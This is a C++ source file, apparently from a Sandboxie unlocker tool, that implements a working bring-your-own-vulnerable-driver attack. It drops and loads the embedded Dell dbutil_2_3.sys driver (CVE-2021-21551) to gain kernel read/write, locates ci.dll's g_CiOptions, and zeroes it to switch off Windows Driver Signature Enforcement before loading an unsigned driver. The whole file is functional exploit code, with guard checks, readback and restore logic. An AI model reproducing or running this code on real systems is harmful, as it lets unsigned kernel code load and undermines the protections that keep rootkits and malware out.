/*
 * unlock_loader.cpp - BYOVD DSE patch used before loading the self-built
 * SbieDrv.sys.
 *
 * x64 only. The embedded Dell dbutil_2_3.sys (CVE-2021-21551) gives kernel
 * read/write; ci.dll!g_CiOptions is located with a port of KDU's scanner and
 * written through a PTE alias because the CiPolicy section is read-only.
 *
 * Prerequisites checked at runtime: HVCI off, test signing off (else no patch
 * is needed), vulnerable driver blocklist off.
 *
 * dbutil / kdrv / pagemap: MIT, CriDos/sandboxie_unlocker.
 * g_CiOptions locator: MIT, hfiref0x/KDU; hde64: BSD-3-Clause.
 */

#include "unlock_loader.h"

#if defined(_M_X64) || defined(_M_AMD64)

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <wchar.h>

#include "log.h"
#include "kmod.h"
#include "kdrv.h"
#include "pagemap.h"
#include "dse_locate.h"

static BOOL g_prepared = FALSE;
static BOOL g_patched = FALSE;
static DWORD g_original = 0;
static ULONG_PTR g_ciOptions = 0;
static kdrv_t g_drv;
static char g_lastError[512] = {0};

static void SetError(const char* fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    _vsnprintf_s(g_lastError, sizeof(g_lastError), _TRUNCATE, fmt, ap);
    va_end(ap);
    LOGE("%s", g_lastError);
}

typedef struct _CI_INFO {
    ULONG Length;
    ULONG CodeIntegrityOptions;
} CI_INFO;

static BOOL QueryCiOptions(CI_INFO* info)
{
    typedef LONG (NTAPI *NtQuerySystemInformationFn)(ULONG, PVOID, ULONG, PULONG);

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    NtQuerySystemInformationFn fn = ntdll
        ? (NtQuerySystemInformationFn)GetProcAddress(ntdll, "NtQuerySystemInformation")
        : NULL;

    if (!fn)
        return FALSE;

    RtlSecureZeroMemory(info, sizeof(*info));
    info->Length = sizeof(*info);
    return fn(103 /* SystemCodeIntegrityInformation */, info, sizeof(*info), NULL) >= 0;
}

static BOOL ExtractDriver(char* path, size_t pathLen)
{
    char winDir[MAX_PATH];
    HANDLE file;
    DWORD written = 0;
    BOOL ok;

    if (!GetWindowsDirectoryA(winDir, MAX_PATH))
        return FALSE;

    _snprintf_s(path, pathLen, _TRUNCATE,
                "%s\\Temp\\sbie_unlock_%lu.sys", winDir, GetCurrentProcessId());

    file = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
        return FALSE;

    ok = WriteFile(file, g_driver_bin, g_driver_size, &written, NULL) &&
         written == g_driver_size;
    CloseHandle(file);

    if (!ok) {
        DeleteFileA(path);
        return FALSE;
    }
    return TRUE;
}

static BOOL CiOptionsAddressLooksValid(HMODULE mapped, ULONG_PTR loadedBase, ULONG_PTR va)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mapped;
    PIMAGE_NT_HEADERS nt;
    ULONG sizeOfImage;

    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    nt = (PIMAGE_NT_HEADERS)((PBYTE)mapped + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    sizeOfImage = nt->OptionalHeader.SizeOfImage;
    if (!sizeOfImage)
        return FALSE;

    return va >= loadedBase && va < loadedBase + sizeOfImage;
}

static BOOL FindCiOptions(ULONG_PTR* outVa)
{
    ULONG64 ciBase;
    WCHAR ciPath[MAX_PATH];
    UINT len;
    HMODULE mapped;
    BOOL ok;

    ciBase = kmod_find("ci.dll");
    if (!ciBase) {
        SetError("ci.dll not found in the kernel module list");
        return FALSE;
    }

    len = GetSystemDirectoryW(ciPath, MAX_PATH);
    if (!len || len + 8 >= MAX_PATH) {
        SetError("GetSystemDirectory failed");
        return FALSE;
    }
    wcscat_s(ciPath, MAX_PATH, L"\\ci.dll");

    mapped = LoadLibraryExW(ciPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!mapped) {
        SetError("LoadLibraryEx(ci.dll) failed: %lu", GetLastError());
        return FALSE;
    }

    ok = LocateCiOptions(mapped, (ULONG_PTR)ciBase, outVa);
    if (!ok) {
        SetError("%s", g_dse_locate_error);
    } else if (!CiOptionsAddressLooksValid(mapped, (ULONG_PTR)ciBase, *outVa)) {
        SetError("resolved g_CiOptions address is outside ci.dll");
        ok = FALSE;
    }

    FreeLibrary(mapped);
    return ok;
}

static void CleanupHelper(void)
{
    /* Deleting marks the service for deletion; the driver image stays loaded
     * until reboot (stopping a live driver is the BSOD risk the reference
     * implementation warns about). It is demand-start, so it will not come
     * back after a reboot. */
    if (g_drv.hSvc)
        DeleteService(g_drv.hSvc);
    kdrv_unload(&g_drv);
}

BOOL SbieUnlockPrepareDriverLoad(void)
{
    CI_INFO ci;
    char winDir[MAX_PATH];
    char tempDir[MAX_PATH];
    char driverPath[MAX_PATH];
    DWORD currentValue = 0, afterWrite = 0;
    DWORD zero = 0;
    int rc;

    if (g_prepared)
        return TRUE;

    g_lastError[0] = 0;

    if (!QueryCiOptions(&ci)) {
        SetError("NtQuerySystemInformation(SystemCodeIntegrityInformation) failed");
        return FALSE;
    }

    if (ci.CodeIntegrityOptions & 0x2000) {
        SetError("HVCI (Memory Integrity) is enabled; disable it and reboot");
        return FALSE;
    }

    if (ci.CodeIntegrityOptions & 0x2) {
        LOGI("test signing is on; loading driver without a DSE patch");
        g_prepared = TRUE;
        return TRUE;
    }

    if (!GetWindowsDirectoryA(winDir, MAX_PATH)) {
        SetError("GetWindowsDirectory failed: %lu", GetLastError());
        return FALSE;
    }
    _snprintf_s(tempDir, sizeof(tempDir), _TRUNCATE, "%s\\Temp", winDir);
    cleanup_stale_temp_drivers(tempDir);

    LOGI("preparing driver load: staging dbutil...");
    if (!ExtractDriver(driverPath, sizeof(driverPath))) {
        SetError("failed to stage dbutil_2_3.sys in %s: %lu", tempDir, GetLastError());
        return FALSE;
    }

    LOGI("loading helper driver %s", driverPath);
    rc = kdrv_load(&g_drv, driverPath);
    if (rc != 0) {
        SetError("helper driver load failed (rc=%d); "
                 "check that Memory Integrity and the vulnerable driver blocklist are off", rc);
        CleanupHelper();
        return FALSE;
    }

    if (!FindCiOptions(&g_ciOptions)) {
        CleanupHelper();
        return FALSE;
    }
    LOGI("g_CiOptions at 0x%llX", (unsigned long long)g_ciOptions);

    if (kdrv_read(&g_drv, g_ciOptions, &currentValue, sizeof(currentValue)) != 0) {
        SetError("kernel read of g_CiOptions failed");
        CleanupHelper();
        return FALSE;
    }

    if (currentValue > 0xFFFF) {
        SetError("implausible g_CiOptions value 0x%lX; refusing to write", currentValue);
        CleanupHelper();
        return FALSE;
    }

    LOGI("current g_CiOptions = 0x%lX; disabling DSE", currentValue);

    if (kdrv_page_write(&g_drv, g_ciOptions, &zero, sizeof(zero)) != 0) {
        SetError("DSE write failed");
        CleanupHelper();
        return FALSE;
    }

    if (kdrv_read(&g_drv, g_ciOptions, &afterWrite, sizeof(afterWrite)) != 0 ||
        afterWrite != 0) {
        SetError("DSE write readback mismatch (got 0x%lX)", afterWrite);
        kdrv_page_write(&g_drv, g_ciOptions, &currentValue, sizeof(currentValue));
        CleanupHelper();
        return FALSE;
    }

    g_original = currentValue;
    g_patched = TRUE;
    g_prepared = TRUE;
    LOGI("DSE disabled (0x%lX -> 0x0)", currentValue);
    return TRUE;
}

void SbieUnlockFinishDriverLoad(void)
{
    if (g_patched) {
        DWORD afterRestore = 0;

        if (kdrv_page_write(&g_drv, g_ciOptions, &g_original, sizeof(g_original)) != 0) {
            LOGE("failed to restore g_CiOptions (DSE stays disabled until reboot)");
        } else if (kdrv_read(&g_drv, g_ciOptions, &afterRestore, sizeof(afterRestore)) != 0 ||
                   afterRestore != g_original) {
            LOGE("g_CiOptions restore readback mismatch (got 0x%lX, expected 0x%lX)",
                 afterRestore, g_original);
        } else {
            LOGI("DSE restored to 0x%lX", g_original);
        }
    }

    if (g_drv.hSvc)
        DeleteService(g_drv.hSvc);
    kdrv_unload(&g_drv);

    g_patched = FALSE;
    g_prepared = FALSE;
    g_ciOptions = 0;
    g_original = 0;
}

const char* SbieUnlockLastError(void)
{
    return g_lastError[0] ? g_lastError : "no error";
}

#else /* !x64 */

BOOL SbieUnlockPrepareDriverLoad(void)
{
    return TRUE; /* DSE patch is x64-only; the x64 build supplies the real one. */
}

void SbieUnlockFinishDriverLoad(void)
{
}

const char* SbieUnlockLastError(void)
{
    return "not supported on this platform";
}

#endif
